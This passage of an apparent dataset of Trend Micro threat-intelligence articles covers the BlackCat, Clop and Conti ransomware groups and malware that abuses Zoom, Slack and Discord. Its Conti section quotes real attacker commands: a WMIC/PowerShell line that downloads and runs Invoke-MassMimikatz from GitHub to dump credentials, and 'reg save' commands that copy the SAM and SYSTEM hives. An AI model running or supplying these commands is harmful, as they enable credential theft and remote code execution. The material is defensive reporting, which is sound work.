Security teams should watch out for the presence of the following malware tools and exploits that are typically used in BlackCat attacks: | Initial Access | Defense Evasion | Discovery | Credential Access | Lateral Movement | Exfiltration | Impact | |---|---|---|---|---|---|---| | | | | | | | | | | | Recommendations All indications of BlackCat’s malicious activities suggest that the ransomware group has predisposed itself to more aggressive attacks.\nIts penchant for unconventional methods, the sophistication of its techniques, and a growing affiliate base show that its operations are robust and will remain so in the future.\nThis should give organizations more reasons to ensure that they are well informed and that they have security measures in place to ward off ransomware threats.\nTo protect systems against similar threats, organizations can establish security frameworks that allocate resources systematically to establish a strong defense strategy against ransomware.\nHere are some best practices that organizations can consider: Audit and inventory - Take an inventory of assets and data. -\nIdentify authorized and unauthorized devices and software. -\nAudit event and incident logs.\nConfigure and monitor - Manage hardware and software configurations. -\nGrant admin privileges and access only when necessary to an employee’s role. -\nMonitor network ports, protocols, and services. -\nActivate security configurations on network infrastructure devices such as firewalls and routers. -\nEstablish a software allowlist that only executes legitimate applications.\nPatch and update - Conduct regular vulnerability assessments. -\nPerform patching or virtual patching for operating systems and applications. -\nUpdate software and applications to their latest versions.\nProtect and recover - Implement data protection, back up, and recovery measures. -\nEnable multifactor authentication (MFA).\nSecure and defend - Employ sandbox analysis to block malicious emails. -\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network. -\nDiscover early signs of an attack such as the presence of suspicious tools in the system. -\nUse advanced detection technologies such as those powered by AI and machine learning.\nTrain and test - Regularly train and assess employees on security skills. -\nConduct red-team exercises and penetration tests.\nA multilayered approach can help organizations guard possible entry points into their system (endpoint, email, web, and network).\nSecurity solutions can detect malicious components and suspicious behavior, which can help protect enterprises. -\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before the ransomware can do irreversible damage to the system. -\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities.\nThis protection is made possible through techniques such as virtual patching and machine learning. -\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. -\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\nIndicators of Compromise (IOCs) The indicators of compromise (IOCs) for the threat discussed in this article can be found here.\nActual indicators might vary per attack.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":90,"metadata":{"source":"blog","platform":"trendmicro","filename":"BlackCat"}}
{"id":185,"title":"Ransomware Spotlight: Clop | Trend Micro (US)","publish_date":"2021-11-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-clop","clean_text":"Ransomware Spotlight: Clop An overview of Clop operations The Clop ransomware appends the “.ClOP” (“Clop” spelled with a small “L”) extension to the files it encrypts.\nResearchers also discovered that Clop targets a victim’s entire network instead of just individual computers.\nThis is made possible by hacking into the Active Directory (AD) server before the ransomware infection to determine the system’s Group Policy.\nThis allows the ransomware to persist in the endpoints even after incident responders have already cleaned them up.\nPrevious attacks by the TA505 group saw the delivery of the Clop malware as the final stage of its payload in massive phishing campaigns.\nThe malicious actors would send spam emails with HTML attachments that would redirect recipients to a macro-enabled document such as an XLS file used to drop a loader named Get2.\nThis loader facilitates the download of various tools such as SDBOT, FlawedAmmyy, and Cobalt Strike.\nOnce the malicious actors intrude into the system, they proceed to reconnaissance, lateral movement, and exfiltration to set the stage for deployment of the Clop ransomware.\nThe operators behind Clop coerce their victims by sending out emails in a bid for negotiations.\nThey also resort to more severe threats such as publicizing and auctioning off the stolen information on their data leak site “Cl0p^_-Leaks” if their messages are ignored.\nThey have also gone to the extent of using quadruple extortion techniques, which have involved going after top executives and customers to pressure companies into settling the ransom.\nHaving established itself well in the world of cybercrime, the Clop ransomware gang is deemed as a trendsetter for its ever-changing tactics, techniques, and procedures (TTPs).\nIndeed, the group’s Kiteworks FTA exploits set a new trend as these significantly pulled up the average ransom payments for the first quarter of 2021.\nA report that cited Coveware’s findings revealed that the average ransomware payments significantly went up to US$220,298, which is an increase of 43%.\nIt also said that the median ransom payment increased sharply to US$78,398 from US$49,459, which translates to a 60% hike.\nRecent Clop activities The Clop ransomware gang also claimed to have targeted 130 organizations who were victims of the Fortra GoAnywhere MFT vulnerability over a month-long period in March 2023.\nAlthough Clop ransomware actors did not share specific details on how they exploited the vulnerability, security researcher Florian Hauser published proof-of-concept code on it, while Fortra released an emergency patch shortly after.\nMeanwhile, in April 2023, Microsoft attributed the exploitation of CVE-2023-27350 to the Clop and LockBit ransomware gangs.\nCVE-2023-27350 is a vulnerability in the widely used print management software solution PaperCut that was disclosed via Trend Micro's Zero Day Initiative (ZDI),™ as covered in ZDI-23-233.\nAccording to Microsoft, the threat actor abused the vulnerability to deploy the Truebot malware and ultimately, the Clop and LockBit ransomware families to steal critical company information.\nIn May of this year, it was reported that FIN7 (aka Sangria Tempest) used the POWERTRASH malware to launch the Lizar toolkit in a series of that started in April 2023.\nThe cybercrime group used the backdoor to take hold of and laterally move within the victim’s network and finally, distribute the Clop ransomware on compromised machines.\nSince May 2023, the group continuously exploited critical zero-day vulnerabilities in file transfer software MOVEit Transfer and MOVEit Cloud via CVE-2023-24362 and CVE-2023-35036, to compromise a number of private and public organizations from various industries.\nWhile the company was able to immediately deploy workarounds, Clop exploited these openings to get into vulnerable systems and networks to exfiltrate sensitive data.\nResearchers and analysts have noted that no ransomware payloads were observed from these attacks, but that the group were focused more on extortion and threatened these high value targets with publishing sensitive and proprietary information.\nAn additional SQL injection security gap still awaiting a CVE assignment and a patch also surfaced in June, which the group exploited.\nThe number of attacks documented to hold systems and information hostage as a routine are going down, which is common among other ransomware groups in recent months.\nHowever, the same techniques and skills are being used to compromise vulnerable systems and networks to steal data or extort companies in exchange for keeping these companies’ information confidential.\nTop affected countries and industries In this section, we discuss Trend Micro™ Smart Protection Network™ (SPN) data on detections of Clop attempts to compromise organizations.\nOur detections reveal that Türkiye had the largest number of attack attempts at 94 followed by Canada with 80 attempts.\nThe rest of the detections are spread across North America, South America, Asia Pacific, Europe, and the Middle East.\nFigure 1.\n10 countries with the highest number of attack attempts per machine for the Clop ransomware (January 1, 2023 to May 31, 2023) While other known RaaS operators claim to avoid the healthcare sector as a target out of humanitarian consideration, our detections reveal that this is not the case for Clop as it is still within the gang’s top five targets.\nThe highest number of detections is at 75 in the banking industry, followed by a distant second of 42 detections in the retail sector.\nFigure 2.\n10 industries with the highest number of attack attempts per machine for the Clop ransomware (January 1, 2023 to May 31, 2023) Source: Trend Micro Smart Protection Network infrastructure By breaking down the detections per month, we are able to determine that 2023 saw a sudden increase in Clop attacks in May of the same year at 245 attack attempts, significantly higher than the detections in prior months.\nOur detections suggest that Clop deployments were implemented at a steady pace from January to April 2023 before surging in May.\nFigure 3.\nMonthly breakdown of detections per machine for the Clop ransomware (January 1, 2023 to May 31, 2023) Source: Trend Micro Smart Protection Network infrastructure Targeted regions and industries according to Clop ransomware’s leak site This section looks at data based on attacks recorded on the Clop ransomware operators’ leak site.\nThe following data represents organizations successfully infiltrated by Clop ransomware, which have refused to pay the ransom demand as of writing.\nBased on a combination of Trend Micro’s open-source intelligence (OSINT) research and investigation of the leak site, Clop ransomware compromised a total of 111 organizations from January to May 2023.\nOf these, 64 were organizations operating from North America, while 17 were from Europe.\nEnterprises in Asia, Latin America, the Middle East, and Africa were also compromised.\nFigure 4.\nThe distribution by region of Clop ransomware’s victim organization Source: Clop ransomware’s leak site and Trend Micro’s OSINT research (January 2023 – May 2023) The United States had the most victim organizations with 54 compromised organizations, while 10 enterprises located in the United Kingdom and Canada were also affected.\nThe next four countries most targeted by threat actors behind Clop are Australia, Colombia, India, and Mexico.\nFigure 5.\nThe 10 countries most targeted by the Clop ransomware group Source: Clop ransomware’s leak site and Trend Micro’s OSINT research (January 2023 – May 2023) The majority of Clop ransomware victim organizations were large enterprises, followed closely by small- and medium-sized businesses.\nFigure 6.\nThe distribution by organization size of Clop ransomware’s victim organizations Source: Clop ransomware’s leak site and Trend Micro’s OSINT research (January 2023 – May 2023) Among the identified sectors of Clop ransomware victim organizations, the IT, healthcare, finance, professional services, and retail industries were its top targets.\nFigure 7.\nThe 10 industries most targeted by Clop ransomware threat actors Source: Clop ransomware’s leak site and Trend Micro’s OSINT research (January 2023 – May 2023) Infection chain and techniques The Clop ransomware that TA505 first distributed evaded detection by using a binary that was digitally signed and verified to make it seem like a legitimate executable file.\nThe group launched a large volume of spear-phishing emails that were sent to the employees of an organization to trigger the infection process.\nFigure 4 shows the infection chain.\nFigure 8.\nThe first infection chain of TA505 In January 2020, TA505 changed the flow of infection by using SDBOT alone to collect and exfiltrate data to the command-and-control (C&C;) server.\nFigure 9 shows the modified infection chain.\nFigure 9.\nThe modified infection chain of TA505 Figure 10.\nThe infection chain of FIN11 Figure 10 shows the infection chain of FIN11’s exploit of the multiple zero-day vulnerabilities in Kiteworks’ FTA so that it could install a newly discovered web shell, DEWMODE.\nFIN11 then used this same web shell to exfiltrate data from the FTA and deliver the Clop ransomware as a payload.\nInitial Access The threat actors behind the Clop ransomware use an established network of affiliates to gain initial access and send a large volume of spear-phishing emails to employees of an organization to induce infection.\nThe malicious actors use a compromised RDP to penetrate the system either by attempting to brute-force passwords or by exploiting some known vulnerabilities.\nThe following are the Kiteworks FTA zero-day exploits that they used in early 2021: - CVE-2021-27101 – SQL injection via a crafted host header - CVE-2021-27102 – Operating system command execution via a local web service call - CVE-2021-27103 – SSRF via a crafted POST request - CVE-2021-27104 – Operating system command execution via a crafted POST request The ransomware group was reported to have exploited the SolarWinds Serv-U product vulnerability tagged as CVE-2021-35211.\nDiscovery Clop’s ransomware toolkit contained several malware types to harvest information: - FlawedAmmyy remote access trojan (RAT) collects information and attempts to communicate with the C&C; server to enable the download of additional malware components. -\nAfter getting through the AD server, it will download an additional hacking tool, Cobalt Strike. -\nSDBOT, another RAT, propagates the infection in many ways, including exploiting vulnerabilities and dropping copies of itself in removable drives and network shares.\nIt is also capable of propagating when shared through peer-to-peer (P2P) networks.\nMalicious actors use SDBOT as a backdoor to enable other commands and functions to be executed in the compromised computer.\nLateral Movement, Discovery, and Defense Evasion At this stage, the malware scans for the workgroup information of the machine to distinguish personal machines from enterprise ones.\nIf the workgroup is the default by value, the malware will stop malicious behavior and delete itself.\nIf the AD server domain is returned, a machine gets classified as a corporate machine.\nThe malware attempts to hack the AD server using Server Message Block (SMB) vulnerabilities and using the added downloaded hacking tool Cobalt Strike.\nCobalt Strike is a known tool for post-exploitation that has been previously connected to other ransomware families.\nMeanwhile, TinyMet is used to connect the reverse shell to the C&C; server.\nThe AD server admin account is used to propagate the Clop ransomware to internal network machines.\nAs for SDBOT, it uses application shimming to preserve the continuity of the attack and to avoid detection.\nExfiltration One attack was observed as using DEWMODE to exfiltrate stolen data.\nImpact The ransomware payload that terminates various Windows services and processes proceeds to its encryption routine.\nAdditional insights In the course of monitoring the Clop ransomware group’s activity over the years, we observed that it follows a distinct attack chain or flow: As the attacks on both Accellion FTA and GoAnywhere, as well as the more recent incidents involving the MOVEit zero-day vulnerability show, the ransomware group focuses on finding zero-day vulnerabilities on third-party file transfer applications.\nBased on its recent activity, the Clop ransomware group prefers abusing these vulnerabilities to gain initial access, exfiltrate data, and fultimately, deliver its ransomware payload.\nIn some cases, Clop delivers its payload using tools and malware in its arsenal.\nRecently, however, the ransomware group appears to be focusing on data breach and extortion.\nIn January 2020, TA505 changed the flow of infection by using SDBOT alone to collect and exfiltrate data to the command-and-control (C&C;) server.\nFigure 9 shows the modified infection chain.\nMITRE tactics and techniques | Initial Access | Execution | Persistence | Privilege Escalation | Defense Evasion | Discovery | Lateral Movement | Collection | Command and Control | Exfiltration | Impact | |---|---|---|---|---|---|---|---|---|---|---| T1566.001 - Phishing: Spear-phishing attachment Arrives via phishing emails that have Get2 Loader, which will download the SDBot and FlawedAmmy RAT T1190 - Exploit public-facing application T1078 - Valid accounts | T1106 - Native API T1059 - Command and scripting interpreter T1204 - User executionUser execution is needed to carry out the payload from the spear-phishing link/attachments | T1547 - Boot or logon autostart execution Creates registry run entries to execute the ransomware as a service T1543.003 - Create or modify system process: Windows service | T1484.001 - Domain Policy modification: Group Policy modification Uses stolen credentials to access the AD servers to gain administrator privilege and attack other machines within the network T1068 - Exploitation for privilege escalation T1574 - Hijack execution flow | T1036.001 - Masquerading: invalid code signature T1562.001 - Impair defenses: disable or modify tools T1140 - Deobfuscate/Decode files or information T1070.004 - Indicator removal on host: file deletion T1055.001 - Process injection: DLL injection T1202 - Indirect command execution T1070.001 - Indicator removal on host: clear Windows event logs | T1083 - File and directory discovery T1018 - Remote system discovery T1057 - Process discovery T1082 - System information discovery T1012 - Query registry T1063 - Security software discovery | T1570 - Lateral tool transfer T1021.002 - Remote services: SMB/Windows admin shares | T1005 - Data from local system | T1071 - Application Layer Protocol | T1567 - Exfiltration over web service | T1486 - Data encrypted for impact T1490 - Inhibit system recovery | Summary of malware, tools, and exploits used Security teams can watch out for the presence of the following malware tools and exploits that are typically used in Clop attacks: | Initial Entry | Execution | Discovery | Privilege Escalation | Lateral Movement | Command and Control | Defense Evasion | Exfiltration | |---|---|---|---|---|---|---|---| | | | | | | | | Recommendations Despite arrests of alleged members of the Clop ransomware cartel in Ukraine in 2021, our detections of this ransomware indicate that the group is still a potential threat and might strike anytime.\nMoreover, the operators behind Clop are known to regularly change their TTPs, which means that expecting them to sharpen the proverbial saw is par for the course.\nIt is therefore best to stay vigilant and armed with the knowledge that ransomware operators are always waiting for a chance to pounce on their next victim.\nTo protect systems against similar threats, organizations can establish security frameworks that allocate resources systematically for establishing a strong defense strategy against ransomware.\nHere are some best practices that organizations can consider: Audit and inventory - Take an inventory of assets and data. -\nIdentify authorized and unauthorized devices and software. -\nMake an audit of event and incident logs.\nConfigure and monitor - Manage hardware and software configurations. -\nGrant admin privileges and access only when necessary to an employee’s role. -\nMonitor network ports, protocols, and services. -\nActivate security configurations on network infrastructure devices such as firewalls and routers. -\nEstablish a software allowlist that only executes legitimate applications.\nPatch and update - Conduct regular vulnerability assessments. -\nPerform patching or virtual patching for operating systems and applications. -\nUpdate software and applications to their latest versions. -\nTo prevent attacks like the Kiteworks FTA exploits, update to and patch the latest version of the FTA to clear the zero-day vulnerabilities that were released by the malicious actors and dedicated to the attack signatures.\nProtect and recover - Implement data protection, backup, and recovery measures. -\nEnable multifactor authentication (MFA).\nSecure and defend - Employ sandbox analysis to block malicious emails. -\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network. -\nDetect early signs of an attack such as the presence of suspicious tools in the system. -\nUse advanced detection technologies such as those powered by AI and machine learning.\nTrain and test - Regularly train and assess employees on security skills. -\nConduct red-team exercises and penetration tests.\nA multilayered approach can help organizations guard the possible entry points into the system (endpoint, email, web, and network).\nSecurity solutions that detect malicious components and suspicious behavior could also help protect enterprises. -\nTrend Vision One™ enables security teams to continuously identify the attack surface, including known, unknown, managed, and unmanaged cyber assets.\nIt automatically prioritizes risks, including vulnerabilities, for remediation, taking into account critical factors such as the likelihood and impact of potential attacks.\nVision One offers comprehensive prevention, detection, and response capabilities backed by AI, advanced threat research, and intelligence.\nThis leads to faster mean time to detect, respond, and remediate, improving the overall security posture and effectiveness. -\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities.\nThis protection is made possible through techniques such as virtual patching and machine learning. -\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. -\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\nIndicators of Compromise (IOCs) The IOCs for this article can be found here.\nActual indicators might vary per attack.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":132,"metadata":{"source":"blog","platform":"trendmicro","filename":"Clop"}}
{"id":186,"title":"Malicious Actors Target Comm Apps such as Zoom, Slack, Discord | Trend Micro (US)","publish_date":null,"link":"https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-actors-target-comm-apps-such-as-zoom-slack-discord","clean_text":"Malicious Actors Target Comm Apps such as Zoom, Slack, Discord In our 2020 midyear report, we discussed how the Covid-19 pandemic had forced many organizations to shift from physical offices to virtual ones — a change that also led to the rise of messaging and video conferencing apps as indispensable tools for communication.\nWhile these apps have provided businesses a way of maintaining communication between employees, they have also caught the eye of malicious actors who are always looking to integrate new techniques in their malicious activities.\nZoom-based attacks have remained consistent No other software has defined 2020 as much as the video conferencing app Zoom, which has exploded in popularity since the start of the pandemic.\nGiven its high usage rate among schools, businesses, and individuals, it’s no surprise that cybercriminals have been focusing their efforts on Zoom-based attacks.\nThe most well-known malicious activity involving Zoom is probably “Zoombombing,” which involves pranksters crashing a meeting and then performing disruptive actions, such as spamming pornographic content or even just generally being a nuisance.\nWhile annoying, Zoombombing is typically harmless in terms of security.\nOn the other hand, we’ve encountered Zoom-related attacks that involve actual malware, which can potentially be more damaging to organizations and individuals.\nThe most common Zoom-related attack technique is the use of Zoom installers bundled with malware.\nIn some cases, the attackers use fake Zoom installers to trick users into installing them on their machines.\nWe encountered an example of this in May, after we found samples of malware files that were disguised as fake Zoom installers.\nWhile it could be difficult for the average user to distinguish the legitimate Zoom app from the fake ones, closer inspection shows that the malicious versions have significantly larger file sizes.\nFigure 1.\nThe file size of malicious Zoom copies compared with that of the legitimate installer One of the malware samples (Trojan.\nWin32.ZAPIZ.A) is a backdoor with remote access features, allowing the attacker to gain access to the infected machine to perform malicious actions, such as stealing information.\nThe other sample (Backdoor.\nWin32.DEVILSHADOW.THEAABO) has an installer that consists of a file containing malicious commands.\nInterestingly, both compromised installers installed a legitimate version of Zoom, likely to hide evidence of malicious activity from the user.\nAside from using compromised installers, we also found instances where malicious actors bundled legitimate installers with malware files.\nIn April, we discovered an attack that used real Zoom installers that came with the RevCode WebMonitor RAT (Backdoor.\nWin32.REVCODE.THDBABO).\nThis malware variant allows its operator to execute commands remotely, such as adding or deleting files, recording keystrokes, and gathering information.\nAnother example of this is the ZAPIZ malware (Trojan.\nWin32.\nZAPIZ.A), a trojan that also comes bundled with a legitimate Zoom installer.\nOnce downloaded, it will kill all running remote utilities, after which it will use PORT =5650/TCP for remote inbounding.\nBased on our analysis, ZAPIZ will perform information theft, gathering the target machine’s usernames and its machine name — perhaps as a prelude to further attacks.\nWe also found an email sample where a malicious actor tried to extort money from the victim by threatening them with the release of compromised video footage — allegedly acquired via a hacked camera.\nAbuse of other communication apps such as Discord and Slack While Zoom remains perhaps the most popular communication app during the pandemic, it’s not the only one that cybercriminals have abused.\nWe found evidence of attacks that integrate other communication services — specifically Slack and Discord — into their routines.\nSlack has earned a loyal following over the years, with over 10 million daily active users as of 2019.\nHowever, we also found evidence of malicious actors making use of some of its features.\nWe recently found a ransomware variant (Ransom.\nWin32.CRYPREN.C) that, on the surface, seems fairly standard in terms of capabilities.\nIt encrypts files with the following extensions (after which it will append the .encrypted suffix): - .bmp - .doc - .docx - .gif - .jpeg - .jpg - .m2ts - .m4a - .mkv - .mov - .mp3 - .mp4 - .mpeg - .mpg - .png - .ppt - .pptx - .txt - .xls - .xlsx Figure 3.\nThe ransom note for the Crypren ransomware What makes Crypren interesting is its use of Slack webhooks to report its victims’ encryption status back to its command-and-control (C&C) server — a technique we haven’t encountered before.\nCurrently, it only sends back a minimal amount of data, namely computer and user names, the number of infected files, and the infection timestamp — indicating that the use of Slack for infection status reporting might still be in its testing phase.\nDiscord is another communication software that shares similar features with Slack (while also being notable for its widespread use in gaming communities).\nWe found samples that show how malicious actors are using Discord as part of a campaign involving malicious spam emails that eventually end in an AveMaria or AgentTesla malware infection.\nWe first observed the use of malicious spam to deliver these malware families in 2019 — however, the addition of Discord as part of its attack routine is relatively recent.\nThe malicious emails are typically either postal delivery notifications or invoices with an included DHL or TNT-themed attachment: Figure 4.\nSpam mail sample These emails come with embedded links — either in the images or the text — that point to a Discord URL with the following format: hxxps://cdn[.]discordapp[.]com/attachments/{ChannelID}/{AttachmentID}/example[.]exe.\nThese URLs are used to host AveMaria and AgentTesla, which will then infect the users’ machines once they click on the executable.\nThe use of legitimate apps such as Slack and Discord as part of an attack may come down to a few simple reasons: they’re well-known, widely used, free, and provide some form of anonymity.\nFurthermore, users are not even required to have the apps installed to download files from them, making the process streamlined and efficient.\nAnother possible reason that explains these programs' use is that they can pass off as normal legitimate network communication.\nTheir popularity also amounts to a high chance that employees and end-users are already using these services.\nDefending against attacks that abuse communication apps Fortunately, defending against these types of attacks is relatively straightforward.\nIn the case of the Zoom installers, the commonality between the attacks is that they are downloaded from places other than the official Zoom download page.\nThe simplest way to avoid infection is to download communications apps (and all apps in general) only from official channels.\nThis will ensure that the software is free from tampering.\nUsers should also avoid clicking on any links or downloading attachments from suspicious or unverified emails.\nIf unsure, it would be a good idea to double-check with the alleged sender to confirm if they were the ones who sent the email.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":63,"metadata":{"source":"blog","platform":"trendmicro","filename":"Comm-Apps"}}
{"id":187,"title":"Ransomware Spotlight: Conti | Trend Micro (US)","publish_date":null,"link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-conti","clean_text":"Ransomware Spotlight: Conti Top affected industries and counties Conti attacks have been detected all over the globe, with the US amassing over a million attack attempts from January 1 to November 12, 2021.\nThe Netherlands and Taiwan ranked second and third respectively.\nFigure 1.\nCountries with the highest number of attack attempts for Conti ransomware (January 1 to November 12, 2021) Source: Trend Micro™ Smart Protection Network™ infrastructure The retail industry saw the most Conti attack attempts, followed by insurance, manufacturing, and telecommunications.\nHealthcare, which Conti operators targeted in high-profile attacks this year, is sixth on the list.\nFigure 2.\nIndustries with the highest number of attack attempts for Conti ransomware (January 1 to November 12, 2021) Source: Trend Micro™ Smart Protection Network™ infrastructure Initial Access - Conti can arrive in the system through BazarLoader, which is delivered via phishing emails containing a Google Drive link that downloads the malware. -\nAlternatively, the ransomware can arrive via exploiting the the FortiGate firewall vulnerabilities CVE-2018-13379 and CVE-2018-13374.\nAfter successfully exploiting the application, the ransomware deploys Cobalt Strike to gain a foothold on the system. -\nConti can also arrive as a result of the exploitation of the ProxyShell Microsoft Exchange vulnerabilities.\nDiscovery - For initial reconnaissance, the Conti group uses tools such as Whoami, Nltest, and Net.\nThese tools give the operators information about where they are in the system, and what rights and permissions they have. -\nSince the operators employ double extortion tactics, they actively look for files to exfiltrate in the discovery stage.\nThe threat actors use tools such as ShareFinder to identify the shares needed for exfiltration and ransomware deployment.\nPrivilege Escalation - Although the group mostly relies on finding the domain admin credentials to gain full access to the domain, they may also use a couple of exploits like Zerologon (CVE-2020-1472) and PrintNightmare (CVE-2021-1675), to elevate their privilege and further strengthen their foothold in the network.\nCredential Access - The attackers dump cached credentials on systems to allow them to move laterally or elevate their privilege.\nThey use tools such as ProcDump to dump system process/es (usually lssas.exe) and use it in combination with Mimikatz to dump credentials. -\nIn other cases, they may use mass-mimikatz, a module from Empire, to dump the credentials on multiple systems. -\nMimikatz (mass-mimikatz, from Empire) C:\\WINDOWS\\SYSTEM32\\WBEM\\WMIC.exe /node:localhost process call create powershell /c IEX (NewObjectNet.\nWebClient).DownloadString('https://raw.githubusercontent[.]com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'24346D,COMPUTERNAME2'|Invoke-MassMimikatz -Verbose > c:/programdata/2.txt - Mimikatz (mass-mimikatz, from Empire) - Alternatively, they may also use the kerberoasting module of the PowerShell empire or use tools like Rubeus. -\nThe attackers may also use native Windows tools, such as Task Manager, to dump the memory of lsass or use the comsvcs DLL file’s MiniDump function. -\nThey also gain access to the credentials by taking them out of password stores. -\nOne of the ways to do this is through “reg save” commands. -\nreg save HKLM\\SAM C:\\programdata\\SamBkup.hiv - reg save HKLM\\SYSTEM C:\\programdata\\FileName.hiv - They can also use tools such as Get-GPPPassword to get plain text passwords stored in the group policy preference - One of the ways to do this is through “reg save” commands. -\nThey can also gain credentials from browsers and cloud applications using tools such as SharpChrome and SeatBelt. -\nAfter gaining enough credentials, they use SMBAutoBrute to automate the task of bruteforcing the passwords and see what password works. -\nAfter gaining information on the domain accounts, the attackers then dump the domain controller credentials using Ntdsutil. -\nAlternatively, they can also use Vssadmin to create a snapshot of the system and download Ntds.dit to accomplish this.\nLateral Movement - The attackers can also use batch files to disable security tools.\nThese files are executed through scheduled tasks. -\nThe groups are also known to use third-party tools such as Atera and AnyDesk to control remote systems. -\nThe operators are also known to use EternalBlue to move laterally in the network of systems that are vulnerable to this exploit. -\nThey also use PSExec to remotely execute scripts and the ransomware itself.\nDefense Evasion - Just before the execution of the ransomware, threat actors create a series of batch files to automate the distribution of its tools in the domain.\nThese tools include scripts to terminate existing security software. -\nThe operators can also use other tools, like GMER, PC Hunter, and PowerShell, to accomplish this.\nExecution - Ties to the Trickbot gang gave Conti operators the ability to execute the ransomware via BazarLoader, which leads to Cobalt Strike, which eventually leads to the ransomware itself. -\nOnce the actors are inside the network, they tend to use scheduled tasks and batch files as a means of execution on remote systems. -\nAlternatively, to execute the ransomware the operators can use files such as the DontSleep.exe process, which calls the task manager where the file can be executed.\nExfiltration - The attackers perform data exfiltration on the system with the use of the Rclone tool, which is an open-source tool used for syncing files to a specified cloud storage, such as Mega cloud storage. -\nThe group can also use WinSCP to exfiltrate data.\nImpact - After exfiltration and distribution of the ransomware to the targeted endpoints, the files are now encrypted using ChaCha20 with RSA4096 to protect the ChaCha key and nonce. -\nThe ransomware also inhibits system recovery by deleting shadow copies using WMI.\nMITRE tactics and techniques | Initial Access | Execution | Persistence | Privilege Escalation | Credential Access | Lateral Movement | Defense Evasion | Command and Control | Exfiltration | Impact | |---|---|---|---|---|---|---|---|---|---| T1566 - Phishing T1190 - Exploit public-facing application | T1106 - Execution through API T1059.003 - Command and scripting interpreter: Windows command shell T1047 - Windows Management Instrumentation T1204 - User execution T1053.005 - Scheduled task/job: scheduled task | T1053.005 - Scheduled task/job: Scheduled task | T1078.002 - Valid accounts: domain accounts T1083 - File and directory discovery T1018 - Remote system discovery T1057 - Process discovery T1016 - System network configuration discovery T1069.002 - Permission groups discovery: domain groups T1082 - System information discovery T1033 - System owner/user discovery T1012 - Query registry T1063 - Security software discovery | T1003 - OS credential dumping T1555 - Credentials from password stores T1552 - Unsecured credentials | T1570 - Lateral tool transfer T1021.002 - Remote services: SMB/Windows admin shares | T1562.001 - Impair defenses: disable or modify tools T1140 - Deobfuscate/Decode files or information T1055 - Process injection | T1071 - Application Layer Protocol T1219 - Remote access software | T1567.002 - Exfiltration over web service: exfiltration to cloud storage | T1486 - Data encrypted for impact T1489 - Service stop T1490 - Inhibit system recovery | Summary of malware, tools, and exploits used Security teams can watch out for the presence of the following malware tools, and exploits that are typically used in Conti attacks: | Initial Entry | Execution | Discovery | Privilege Escalation | Credential Access | Lateral Movement | Defense Evasion | Exfiltration | Command and Control | |---|---|---|---|---|---|---|---|---| | | | | | | | | | Recommendations To help defend systems against similar threats, organizations can establish security frameworks, which can allocate resources systematically for establishing a solid defense against ransomware.\nHere are some best practices that can be included in these frameworks: Audit and inventory - Take an inventory of assets and data - Identify authorized and unauthorized devices and software - Make an audit of event and incident logs Configure and monitor - Manage hardware and software configurations - Grant admin privileges and access only when necessary to an employee’s role - Monitor network ports, protocols, and services - Activate security configurations on network infrastructure devices such as firewalls and routers - Establish a software allow list that only executes legitimate applications Patch and update - Conduct regular vulnerability assessments - Perform patching or virtual patching for operating systems and applications - Update software and applications to their latest versions Protect and recover - Implement data protection, backup, and recovery measures - Enable multifactor authentication Secure and defend - Employ sandbox analysis for blocking malicious emails - Deploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network - Detect early signs of an attack such as the presence of suspicious tools in the system - Use advanced detection technologies such as those powered by AI and machine learning Train and test - Regularly train and assess employees on security skills - Do red-team exercises and penetration tests A multilayered approach can help organizations guard the possible entry points into the system (endpoint, email, web, and network).\nSecurity solutions can detect malicious components and suspicious behavior could help protect enterprises. -\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before the ransomware can do irreversible damage to the system. -\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities.\nThis protection is made possible through techniques such as virtual patching and machine learning. -\nTrend 